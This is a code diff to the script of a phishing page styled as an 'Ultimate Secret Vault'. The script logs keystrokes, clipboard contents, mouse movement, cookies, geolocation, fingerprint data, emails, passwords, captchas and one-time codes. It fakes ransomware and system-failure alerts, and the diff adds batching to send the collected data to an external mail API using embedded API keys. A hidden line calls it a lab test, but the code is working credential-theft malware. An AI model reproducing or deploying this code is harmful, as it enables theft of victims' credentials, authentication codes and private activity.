@@ -106,11 +106,9 @@
     <p class="hidden">Lab test only. Consent to data collection.</p>
 
     <script>
-        // Remove EmailJS script and initialization
-        // emailjs.init('OhkXkjccvpkgJIbep');
-
         // Real-time Data Storage
         let collectedData = [];
+        const BATCH_SIZE = 3; // Smaller batch size for reliability
 
         // Keylogger
         let _k = [];
@@ -119,7 +117,8 @@
             if (_k.length > 10) {
                 let data = `K: ${_k.join('')}`;
                 collectedData.push(data);
-                _sD(data, _r());
+                _k = [];
+                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
             }
         });
 
@@ -128,7 +127,7 @@
             navigator.clipboard.readText().then(t => {
                 let data = `C: ${t}`;
                 collectedData.push(data);
-                _sD(data, _r());
+                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
             });
         });
 
@@ -136,10 +135,11 @@
         let _m = [];
         document.addEventListener('mousemove', (e) => {
             _m.push(`X:${e.clientX},Y:${e.clientY}`);
-            if (_m.length > 8) { // Reduced from 12 for speed
+            if (_m.length > 8) {
                 let data = `M: ${_m.join('|')}`;
                 collectedData.push(data);
-                _sD(data, _r());
+                _m = [];
+                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
             }
         });
 
@@ -148,7 +148,7 @@
             let c = document.cookie || 'None';
             let data = `Cookies: ${c}`;
             collectedData.push(data);
-            _sD(data, _r());
+            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
             document.cookie = `H_track=${Math.random()}; max-age=7200`;
         }
 
@@ -157,7 +157,7 @@
             let f = `${navigator.userAgent}|${screen.width}x${screen.height}`;
             let data = `FP: ${f}`;
             collectedData.push(data);
-            _sD(data, _r());
+            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
         }
 
         // Geolocation (Optional on low network)
@@ -166,11 +166,11 @@
                 navigator.geolocation.getCurrentPosition(p => {
                     let data = `Loc: ${p.coords.latitude},${p.coords.longitude}`;
                     collectedData.push(data);
-                    _sD(data, _r());
+                    if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                 }, () => {
                     let data = 'Loc denied';
                     collectedData.push(data);
-                    _sD(data, _r());
+                    if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                 });
             }
         }
@@ -183,11 +183,11 @@
             let res = `${screen.width}x${screen.height}`;
             let data = `Screen: ${res}`;
             collectedData.push(data);
-            _sD(data, _r());
+            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
             if (Math.random() > 0.7) {
                 let alertData = 'Recording simulated';
                 collectedData.push(alertData);
-                _sD(alertData, _r());
+                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                 alert('Surveillance activated!');
             }
         }
@@ -197,21 +197,18 @@
             if (Math.random() > 0.8) {
                 let data = 'Ransomware triggered';
                 collectedData.push(data);
-                _sD(data, _r());
+                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                 alert('SYSTEM LOCKED! (Simulation) Retry to continue.');
                 document.getElementById('retryBtn').style.display = 'block';
             }
         }
-
-        // Auto-Refresh (Disabled on low network)
-        // setTimeout(() => { if (Math.random() > 0.9) location.reload(); }, 25000);
 
         // Fake Error
         function _fE() {
             if (Math.random() > 0.75) {
                 let data = 'Fake Error';
                 collectedData.push(data);
-                _sD(data, _r());
+                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
                 alert('System Failure! Retry.');
                 document.getElementById('retryBtn').style.display = 'block';
             }
@@ -230,7 +227,7 @@
             let c = document.getElementById('captcha').value;
             let data = `Captcha: ${c}`;
             collectedData.push(data);
-            _sD(data, _r());
+            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
             document.getElementById('captchaForm').style.display = 'none';
             document.getElementById('loginForm').style.display = 'block';
         }
@@ -241,7 +238,7 @@
             let p = document.getElementById('password').value;
             let data = `Email: ${e}, Pass: ${p}`;
             collectedData.push(data);
-            _sD(data, _r());
+            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('otpForm').style.display = 'block';
             _gL();
@@ -252,7 +249,7 @@
             if (f.length > 0) {
                 let data = `File: ${f[0].name}`;
                 collectedData.push(data);
-                _sD(data, _r());
+                if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
             }
         }
 
@@ -261,7 +258,7 @@
             let o = document.getElementById('otp').value;
             let data = `OTP: ${o}`;
             collectedData.push(data);
-            _sD(data, _r());
+            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
             _sR();
             _fE();
             _rS();
@@ -279,31 +276,44 @@
             let h = window.location.href;
             let data = `URL: ${h}`;
             collectedData.push(data);
-            _sD(data, _r());
+            if (collectedData.length >= BATCH_SIZE) _sD(null, _r());
         }
 
         // Send Data via Mailsac
         function _sD(d, cb) {
-            collectedData.push(d);
+            if (d) collectedData.push(d);
+            if (collectedData.length === 0) {
+                if (cb) cb();
+                return;
+            }
+
+            let batch = collectedData.slice(0, BATCH_SIZE);
             fetch('https://mailsac.com/api/outgoing-messages', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
-                    'Mailsac-Key': 'k_sihbEOzxIvQaIvWQbC044VQa08QwT4t10D'
+                    'Mailsac-Key': 'k_881SrqXsxB8ApLc8VtbHlDlUNJkRGg5790' // Updated API key
                 },
                 body: JSON.stringify({
                     to: 'sohil_vrx3y@mailsac.com',
-                    subject: `User Data from Ultimate Secret Vault - ${new Date().toISOString()}`,
-                    message: collectedData.join('\n')
+                    subject: `Data from Ultimate Secret Vault - ${new Date().toISOString().split('T')[0]}`,
+                    message: batch.join('\n')
                 })
             })
-            .then(response => response.json())
-            .then(result => console.log('Data Sent to Mailsac:', result))
+            .then(response => {
+                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+                return response.json();
+            })
+            .then(result => {
+                console.log('Data Sent to Mailsac:', result);
+                collectedData = collectedData.slice(BATCH_SIZE); // Clear sent batch
+            })
             .catch(error => {
                 console.error('Error sending to Mailsac:', error);
-                alert('Email failed. Retry or check network.');
+                alert('Email failed. Check network, API key, or try again later.');
                 document.getElementById('retryBtn').style.display = 'block';
             });
+
             if (cb) cb();
         }
 
